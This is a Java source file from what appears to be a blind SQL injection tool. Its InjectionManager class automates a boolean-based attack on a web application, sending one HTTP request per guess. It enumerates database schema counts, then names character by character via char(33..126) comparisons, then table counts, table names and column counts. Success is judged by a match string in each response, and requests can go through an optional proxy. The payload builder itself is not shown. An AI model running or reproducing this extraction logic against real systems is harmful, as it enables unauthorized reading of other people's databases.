package control;

import java.net.InetSocketAddress;
import java.net.Proxy;
import java.util.ArrayList;
import java.util.List;
import java.util.Vector;

import javax.swing.SwingWorker;
import javax.swing.table.DefaultTableModel;

import config.SystemConfig;
import http.HttpHelper;
import http.HttpPayload;
import http.HttpPayloadFactory;
import input.Step;
import input.UserInput;
import query.QueryParam;
import query.QueryType;
import result.ResultPanel;
import status.StatusPanel;

/**
 *
 * @brief	: 
 * @author	: Jae-Woong Moon(mjw8585@gmail.com)
 * @Date	: 2017/09/05
 */
public class InjectionManager{

	/** http  **/
	private HttpHelper httpHelper = null;
	private HttpPayloadFactory factory = null;
	
	/** ui references **/
	private ControlPanel controlPanel = null;
	private ResultPanel resultPanel = null;
	private StatusPanel statusPanel = null;
	
	/** print variables **/
	private int requestCount = 0;
	private UserInput input = null;
	private SystemConfig config = null;
	private InjectionWorker worker = new InjectionWorker();
	
	/** control variables  **/
	private boolean canceled = false;
	private boolean paused = false;
	private boolean workDone = false;
	
	public InjectionManager() {
		factory = new HttpPayloadFactory();
	}
	
	public void setResultPanel(ResultPanel resultPanel) {
		this.resultPanel = resultPanel;
	}
	
	public void setControlPanel(ControlPanel controlPanel){
		this.controlPanel = controlPanel;
	}
	
	public void setStatusPanel(StatusPanel statusPanel) {
		this.statusPanel = statusPanel;
	}
	

	public void start(UserInput input, SystemConfig config){
		this.input = input;
		this.config = config;
		httpHelper = new HttpHelper();
		// ローカルプロキシ設定がある場合
		if(config.getProxyAddress() != null && !config.getProxyAddress().equals("")) {
			Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(config.getProxyAddress(), 
					Integer.parseInt(config.getPortNum())));
			httpHelper.setProxy(proxy);
		}
		
		System.out.println("[STATUS] canceled : " + canceled +", paused : " + paused + ", workDone : " + workDone);
		
		// case 1. after worker canceled
		if (canceled && !paused) {
			worker = new InjectionWorker();
			//resultPanel.clearResults(); 
		}
		// case 2. after worker job has done (new start) 
		if(workDone){
			System.out.println("start new injection worker. ");
			worker = new InjectionWorker();
		}
		
		// start worker
		worker.execute();
		
		// case 3. after paused 
		if (paused){
			resume();
		}
		
	}
	
	public void pause(){
		System.out.println("===== PAUSE");
		paused = true;
	}
	
	public void stop(){
		worker.cancel(true);
		requestCount = 0;
		canceled = true;
		paused = false;
	}
	
	private synchronized void resume(){
		System.out.println("==== RESUME");
		paused = false;
		this.notify();
	}
	

	class InjectionWorker extends SwingWorker<Boolean, Void> {
		
		@Override
		protected Boolean doInBackground(){
			
			try{
				// DB Search
				if(input.getStep() == Step.DB_SCHEMA){
					printLog("DB Search Start...");
					resultPanel.selectTab(0);
					new DBWorker().search();
				}
				// Table Search
				else if(input.getStep() == Step.TABLE){
					printLog("Table Search Start...");
					resultPanel.selectTab(1);
					new TableWorker().search();
				}
				// Column Search
				// ...
				// Data Search
				// ...
				
				System.out.println("==== Worker job has done.");
				printLog("Worker job has done.");
				workDone = true;
				controlPanel.initButtons();
				return true;
				
			}catch(Exception e){
				printLog("Work Excepiton : " + e.getMessage());
				e.printStackTrace();
			}
			return true;
		}
		
	
		class DBWorker{
		
			public void search(){
				printLog("== STEP 1. search db count ");
				QueryParam param = new QueryParam();
				param.setStep(Step.DB_SCHEMA);
				int dbCount = getDBCount(param);  
				if(dbCount == 0){
					return ;
				}
	
				// setting result table
				DefaultTableModel dbTableModel =  resultPanel.getDBResultUI().getTableModel();
				for (int i=0; i < dbCount; i++){
					Integer[] row = {i+1};
					dbTableModel.addRow(row);
				}
				
				printLog("== STEP 2. search db name lengths ");
				List<Integer> dbNameLengths = getDBNameLength(param, dbCount, dbTableModel);
				
				printLog("== STEP 3. search db names ");
				List<String> dbNames = getDBNames(param, dbCount, dbNameLengths, dbTableModel);
				
				printLog("== STEP 4. search table counts ");
				param.setStep(Step.TABLE);
				List<Integer> tableCounts = getTableCounts(param, dbNames, dbTableModel);
			}
		
			private int getDBCount(QueryParam param){
				param.setQueryType(QueryType.COUNT);
				return cntWork(param, config.getCountUntil());
			}
			
			private List<Integer> getDBNameLength(QueryParam param, int dbCount, DefaultTableModel updateTo){
				List<Integer> result = new ArrayList<Integer>();
				param.setQueryType(QueryType.LENGTH);
				
				for (int i=0; i < dbCount; i++){
					param.setDbIndex(i);
					int length = cntWork(param, config.getLengthUntil());
					result.add(length);
					updateTo.setValueAt(length+"", i, 1); // update GUI
					updateTo.fireTableDataChanged();
				}
				return result;
			}
			
			private List<String> getDBNames(QueryParam param, int dbCount, List<Integer> dbNameLengths, DefaultTableModel updateTo){
				List<String> dbNames = new ArrayList<String>();
				param.setQueryType(QueryType.CONTENT);
				
				for (int i=0; i < dbCount; i++){
					param.setDbIndex(i); 
					String dbName = getDBName(param, dbNameLengths.get(i));
					dbNames.add(dbName);
					updateTo.setValueAt(dbName, i, 2);
					updateTo.fireTableDataChanged();
				}
				return dbNames;
			}
			
			private String getDBName(QueryParam param, int dbNameLength){
				String content = "";
				for(int i=0; i < dbNameLength ; i++){
					param.setDbNameIndex(i+1); 
					content += contentWork(param);
				}
				return content;
			}
			
			private List<Integer> getTableCounts(QueryParam param, List<String> dbNames, DefaultTableModel updateTo){
				List<Integer> tableCounts = new ArrayList<Integer>();
				param.setQueryType(QueryType.COUNT);
				for(int i=0; i < dbNames.size(); i++){
					int tableCount = getTableCount(param, dbNames.get(i));
					updateTo.setValueAt(tableCount+"", i, 3);
					updateTo.fireTableDataChanged();
				}
				return tableCounts;
			}
			
			private int getTableCount(QueryParam param, String dbName){
				int tableCount = 0;
				input.setDbName(dbName);
				tableCount = cntWork(param, config.getCountUntil());
				return tableCount;
			}
		}
		
		class TableWorker{
			
			public void search(){
				QueryParam param = new QueryParam();
				param.setStep(Step.TABLE);
				DefaultTableModel updateTo =  resultPanel.getTableResultUI().getTableModel();
				
				// All 인 경우의 동작
				Vector<Vector<String>> dbData = resultPanel.getDBResultUI().getTableModel().getDataVector();
				int tableRowNum = 0;
				for (int i= 0; i < dbData.size(); i++ ){
					Vector<String> dbRow =  dbData.get(i);
					int tableCount =0;
					tableCount = Integer.parseInt(dbRow.get(3));
					for (int j=0; j < tableCount; j++){
						
						/* STEP 2. insert tableRowNum and db name */
						final String dbName =  dbRow.get(2);
						String[] tableRow = {(tableRowNum +1) +"", dbName};
						updateTo.addRow(tableRow);

						/* STEP 3. Search and update table name length */
						int tableNameLength = getTableNameLength(param, dbName, j);
						updateTo.setValueAt(tableNameLength+"", tableRowNum, 2);
						
						/* STEP 4. Search and update table names */
						String tableName = getTableName(param, dbName, tableNameLength);
						updateTo.setValueAt(tableName, tableRowNum, 3);
						
						/* STEP 5. Search and update the number of Columns per each table*/
						param.setStep(Step.COLUMN);
						int columnCnt = getColumnCount(param, dbName, tableName);
						updateTo.setValueAt(columnCnt+"", tableRowNum, 4);
						
						tableRowNum ++;
					}
					
					
				}
			}
			
			// deprecated
			/*
			private void allTableSearch(UserInput input){
				input.setTargetType(Step.TABLE);
				DefaultTableModel updateTo =  resultPanel.getTableResultUI().getTableModel();
				
				// STEP 1. Get target db schema's info from the result UI
				Vector<Vector<String>> dbData = resultPanel.getDBResultUI().getTableModel().getDataVector();
				int tableRowNum = 0;
				for (int i= 0; i < dbData.size(); i++ ){
					Vector<String> dbRow =  dbData.get(i);
					int tableCount =0;
					tableCount = Integer.parseInt(dbRow.get(3));
					for (int j=0; j < tableCount; j++){
						
						// STEP 2. insert tableRowNum and db name
						final String dbName =  dbRow.get(2);
						String[] tableRow = {(tableRowNum +1) +"", dbName};
						updateTo.addRow(tableRow);

						// STEP 3. Search and update table name length
						int tableNameLength = searchTableNamesLength(input, dbName, j);
						updateTo.setValueAt(tableNameLength+"", tableRowNum, 2);
						
						// STEP 4. Search and update table names
						String tableName = searchTableName(input, dbName, tableNameLength);
						updateTo.setValueAt(tableName, tableRowNum, 3);
						
						// STEP 5. Search and update the number of Columns per each table
						int columnCnt = searchColumnCount(input, dbName, tableName);
						updateTo.setValueAt(columnCnt+"", tableRowNum, 4);
						
						tableRowNum ++;
					}
					
					
				}
			}
		*/
			
			private int getTableNameLength(QueryParam param, String dbName, int tableIndex){
				int length = 0;
				param.setQueryType(QueryType.LENGTH);
				param.setDbName(dbName);
				param.setTableIndex(tableIndex);
				length =  cntWork(param, config.getCountUntil());
				return length;
			}
			
			private String getTableName(QueryParam param, String dbName, int tableNameLength){
				String content = "";
				param.setQueryType(QueryType.CONTENT);
				for(int i=0; i < tableNameLength ; i++){
					param.setTableNameIndex(i+1); 
					String chr = contentWork(param); 
					//System.out.println("chr : "  + chr);
					content += chr; 
				}
				return content;
			}
			
			private int getColumnCount(QueryParam param, String dbName, String tableName){
				param.setQueryType(QueryType.COUNT);
				param.setDbName(dbName);
				param.setTableName(tableName);
				return cntWork(param, config.getCountUntil());
			}
			
		}
		
		/*******************************************************************************************************/
		/******************************************* Common ****************************************************/
		/*******************************************************************************************************/
		private int cntWork(QueryParam param, int until){
			
			int cnt = 0;
			for(int i=0; i < until; i++){
				if(!isCancelled()){
					//System.out.println("Cnt work : " + i);
					if(paused){
						//System.out.println("BackGround paused, waiting for resume");
						try{
							synchronized(this){
								wait(1000);
								i--;
							}
						} catch(InterruptedException ex){
							System.out.println("Background interrupted");
						}
					}else{
						requestCount++;
						printRequestCount(requestCount);
						param.setCheckVal(i+"");
						HttpPayload payload = factory.getHttpPayload(input, param);
						String res = httpHelper.send(payload);
						if(res.contains(input.getMatch())){
							cnt = i;
							break;
						}
					}
				}
			}
			return cnt;
		}
		
		private String contentWork(QueryParam param){
			String ascii = "";
			
			for(int j=33; j < 127; j++){ //(search ascii 33~126)
				if(!isCancelled()){
					if(paused){
						//System.out.println("BackGround paused, waiting for resume");
						try{
							synchronized(this){
								wait(1000);
								j--;
							}
						} catch(InterruptedException ex){
							System.out.println("Background interrupted");
						}
					}else{
						requestCount++;
						printRequestCount(requestCount);
						param.setCheckVal("char("+j+")");
						HttpPayload payload = factory.getHttpPayload(input, param);
						String res = httpHelper.send(payload);
						if(res.contains(input.getMatch())){
							ascii = Character.toString((char)j);
							break;
						}
					}
				}
			}
			return ascii;
		}
		
		private void printLog(String msg){
			statusPanel.printLog(msg);
		}
		
		private void printRequestCount(int cnt) {
			statusPanel.printRequestCount(cnt + "");
		}
	}
	
}
